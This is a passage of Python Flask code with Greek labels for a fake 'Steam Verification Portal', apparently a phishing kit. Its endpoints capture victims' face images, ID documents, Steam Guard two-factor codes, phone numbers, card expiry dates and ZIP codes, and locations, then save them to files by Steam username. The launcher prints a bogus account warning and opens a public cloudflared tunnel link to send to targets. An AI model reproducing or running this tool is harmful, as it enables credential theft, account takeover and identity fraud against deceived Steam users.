                'τύπος_επαλήθευσης': data.get('verification_type', 'άγνωστο'),
                'σκοπός': 'επαλήθευση_ηλικίας' if data.get('verification_type') == 'age_verification' else 'ανάκτηση_λογαριασμού'
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση προσώπου Steam: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης προσώπου: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'άγνωστο')
        steam_username = request.form.get('steam_username', 'άγνωστο')
        verification_type = request.form.get('verification_type', 'άγνωστο')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        id_filename = None
        if 'id_file' in request.files:
            id_file = request.files['id_file']
            if id_file.filename:
                file_ext = id_file.filename.split('.')[-1] if '.' in id_file.filename else 'jpg'
                id_filename = f"steam_ταυτότητα_{steam_username}_{session_id}_{timestamp}.{file_ext}"
                id_path = os.path.join(DOWNLOAD_FOLDER, 'έγγραφα_ταυτότητας', id_filename)
                id_file.save(id_path)
        
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'έγγραφα_ταυτότητας', f"metadata_{steam_username}_{session_id}_{timestamp}.json")
        metadata = {
            'id_αρχείο': id_filename,
            'type': 'επαλήθευση_ταυτότητας',
            'steam_όνομα_χρήστη': steam_username,
            'session_id': session_id,
            'τύπος_επαλήθευσης': verification_type,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
            'πλατφόρμα': 'steam',
            'σκοπός': 'επαλήθευση_ηλικίας' if verification_type == 'age_verification' else 'ανάκτηση_λογαριασμού'
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Αποθηκεύτηκε έγγραφο ταυτότητας Steam: {id_filename}")
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης ταυτότητας: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_steam_guard', methods=['POST'])
def submit_steam_guard():
    try:
        data = request.get_json()
        if data and 'guard_code' in data:
            session_id = data.get('session_id', 'άγνωστο')
            steam_username = data.get('steam_username', 'άγνωστο')
            guard_code = data.get('guard_code', '')
            expected_code = data.get('expected_code', '')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"steam_guard_{steam_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'δεδομένα_χρήστη', filename)
            
            guard_data = {
                'type': 'επαλήθευση_steam_guard',
                'steam_όνομα_χρήστη': steam_username,
                'session_id': session_id,
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'πλατφόρμα': 'steam',
                'τύπος_επαλήθευσης': 'steam_guard',
                'δεδομένα_guard': {
                    'εισήχθη_κώδικας': guard_code,
                    'αναμενόμενος_κώδικας': expected_code,
                    'ταιριότητα': guard_code == expected_code
                },
                'διεύθυνση_ip': request.remote_addr,
                'user_agent': request.headers.get('User-Agent', 'άγνωστο')
            }
            
            with open(file_path, 'w') as f:
                json.dump(guard_data, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση Steam Guard: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης Steam Guard: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_phone_verification', methods=['POST'])
def submit_phone_verification():
    try:
        data = request.get_json()
        if data and 'phone_number' in data:
            session_id = data.get('session_id', 'άγνωστο')
            steam_username = data.get('steam_username', 'άγνωστο')
            phone_number = data.get('phone_number', '')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"steam_τηλέφωνο_{steam_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'δεδομένα_τηλεφώνου', filename)
            
            phone_data = {
                'type': 'επαλήθευση_τηλεφώνου',
                'steam_όνομα_χρήστη': steam_username,
                'session_id': session_id,
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'πλατφόρμα': 'steam',
                'τύπος_επαλήθευσης': 'steam_guard',
                'δεδομένα_τηλεφώνου': {
                    'αριθμός_τηλεφώνου': phone_number,
                    'χώρα': 'Άγνωστη',
                    'προμηθευτής': 'Άγνωστος'
                },
                'σκοπός': 'steam_guard_δύο_παραγόντων'
            }
            
            with open(file_path, 'w') as f:
                json.dump(phone_data, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση τηλεφώνου Steam: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης τηλεφώνου: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_payment_verification', methods=['POST'])
def submit_payment_verification():
    try:
        data = request.get_json()
        if data and 'card_number' in data:
            session_id = data.get('session_id', 'άγνωστο')
            steam_username = data.get('steam_username', 'άγνωστο')
            amount = data.get('amount', '€0,00')
            
            # Απόκρυψη αριθμού κάρτας για αποθήκευση
            card_number = data.get('card_number', '')
            masked_card = card_number[-4:] if len(card_number) >= 4 else card_number
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"steam_πληρωμή_{steam_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'δεδομένα_πληρωμής', filename)
            
            payment_data = {
                'type': 'επαλήθευση_πληρωμής',
                'steam_όνομα_χρήστη': steam_username,
                'session_id': session_id,
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'πλατφόρμα': 'steam',
                'τύπος_επαλήθευσης': 'purchase_verification',
                'πληροφορίες_πληρωμής': {
                    'τελευταία_τέσσερα_κάρτας': masked_card,
                    'ημερομηνία_λήξης': data.get('expiry_date', ''),
                    'ποσό': amount,
                    'ταχυδρομικός_κώδικας': data.get('zip_code', '')
                },
                'αποτέλεσμα_επαλήθευσης': 'εκκρεμεί',
                'σκοπός': 'επαλήθευση_μεγάλης_αγοράς'
            }
            
            with open(file_path, 'w') as f:
                json.dump(payment_data, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση πληρωμής Steam: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης πληρωμής: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'άγνωστο')
            steam_username = data.get('steam_username', 'άγνωστο')
            verification_type = data.get('verification_type', 'άγνωστο')
            
            # Επεξεργασία τοποθεσίας στο παρασκήνιο
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Λήφθηκαν δεδομένα τοποθεσίας Steam: {session_id}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης τοποθεσίας: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'άγνωστο')
            steam_username = data.get('steam_username', 'άγνωστο')
            verification_type = data.get('verification_type', 'άγνωστο')
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"steam_ολοκλήρωση_{steam_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'δεδομένα_χρήστη', filename)
            
            data['λήφθηκε_στις'] = datetime.now().isoformat()
            data['πλατφόρμα'] = 'steam'
            data['επαλήθευση_ολοκληρώθηκε'] = True
            data['steam_λογαριασμός_προστατεύεται'] = True
            
            if verification_type == 'steam_guard':
                data['steam_guard_ενεργοποιήθηκε'] = True
                data['αυθεντικοποίηση_δύο_παραγόντων_ενεργή'] = True
            elif verification_type == 'age_verification':
                data['ηλικία_επαληθεύτηκε'] = True
                data['πρόσβαση_σε_περιεχόμενο_για_ενήλικες'] = True
            elif verification_type == 'account_recovery':
                data['λογαριασμός_ανακτήθηκε'] = True
                data['ασφάλεια_ενημερώθηκε'] = True
            else:  # purchase_verification
                data['αγορά_επαληθεύτηκε'] = True
                data['συναλλαγή_ολοκληρώθηκε'] = True
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Αποθηκεύτηκε περίληψη επαλήθευσης Steam: {filename}")
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης περίληψης επαλήθευσης: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/favicon.ico')
def favicon():
    return '', 204

if __name__ == '__main__':
    check_dependencies()
    
    # Λήψη ρυθμίσεων επαλήθευσης
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4050
    script_name = "Πύλη Επαλήθευσης Steam"
    
    print("\n" + "="*60)
    print("ΠΥΛΗ ΕΠΑΛΗΘΕΥΣΗΣ STEAM")
    print("="*60)
    print(f"[+] Όνομα Steam: {VERIFICATION_SETTINGS['steam_username']}")
    print(f"[+] Επίπεδο Steam: {VERIFICATION_SETTINGS['steam_level']}")
    print(f"[+] Παιχνίδια που κατέχει: {VERIFICATION_SETTINGS['steam_games']}")
    print(f"[+] Υπόλοιπο Πορτοφολιού: {VERIFICATION_SETTINGS['steam_wallet']}")
    print(f"[+] Προφίλ: {VERIFICATION_SETTINGS['steam_profile']}")
    print(f"[+] Τύπος Επαλήθευσης: {VERIFICATION_SETTINGS['title']}")
    print(f"[+] Λόγος: {VERIFICATION_SETTINGS['reason']}")
    
    print(f"\n[+] Φάκελος δεδομένων: {DOWNLOAD_FOLDER}")
    
    if VERIFICATION_SETTINGS['face_enabled']:
        print(f"[+] Επαλήθευση προσώπου: Ενεργή ({VERIFICATION_SETTINGS.get('face_duration', 15)}s)")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] Επαλήθευση ταυτότητας: Ενεργή")
    if VERIFICATION_SETTINGS['phone_enabled']:
        print(f"[+] Επαλήθευση τηλεφώνου: Ενεργή")
    if VERIFICATION_SETTINGS['payment_enabled']:
        print(f"[+] Επαλήθευση πληρωμής: Ενεργή ({VERIFICATION_SETTINGS.get('purchase_amount', '€59,99')})")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Επαλήθευση τοποθεσίας: Ενεργή")
    
    print("\n[+] Έναρξη πύλης επαλήθευσης Steam...")
    print("[+] Πατήστε Ctrl+C για διακοπή.\n")
    
    print("="*60)
    print("ΑΠΑΙΤΕΙΤΑΙ ΕΠΑΛΗΘΕΥΣΗ STEAM")
    print("="*60)
    print(f"🎮 Λογαριασμός: {VERIFICATION_SETTINGS['steam_username']}")
    print(f"⭐ Επίπεδο: {VERIFICATION_SETTINGS['steam_level']}")
    print(f"🎮 Παιχνίδια: {VERIFICATION_SETTINGS['steam_games']}")
    print(f"💰 Πορτοφόλι: {VERIFICATION_SETTINGS['steam_wallet']}")
    print(f"⚠️  ΕΙΔΟΠΟΙΗΣΗ: {VERIFICATION_SETTINGS['title']}")
    print(f"📋 ΛΟΓΟΣ: {VERIFICATION_SETTINGS['reason']}")
    if VERIFICATION_SETTINGS['verification_type'] == 'steam_guard':
        print(f"🔐 ΑΣΦΑΛΕΙΑ: Ενεργοποίηση αυθεντικοποίησης δύο παραγόντων Steam Guard")
    elif VERIFICATION_SETTINGS['verification_type'] == 'purchase_verification':
        print(f"💳 ΠΟΣΟ: {VERIFICATION_SETTINGS.get('purchase_amount', '€59,99')}")
    print("="*60)
    print("Ανοίξτε τον παρακάτω σύνδεσμο για να ξεκινήσετε την επαλήθευση Steam...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Τερματισμός πύλης επαλήθευσης Steam...")
        sys.exit(0)